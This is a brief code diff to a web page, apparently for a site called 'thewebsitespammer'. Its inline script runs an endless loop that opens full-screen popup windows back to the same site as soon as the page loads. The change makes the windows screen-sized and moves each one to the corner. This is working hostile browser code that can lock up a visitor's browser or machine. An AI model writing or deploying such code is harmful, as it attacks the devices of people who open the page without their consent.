@@ -37,8 +37,10 @@
     </div>
     
     <script>
-        while (true) {
-            window.open('https://thewebsitespammer.github.io', '_blank');
+        while (true)
+        {
+            var newWindow = window.open('https://thewebsitespammer.github.io', '_blank', 'width=' + window.screen.width + ', height=' + window.screen.height)
+            newWindow.moveTo(0, 0);
         }
     </script>
 </body>
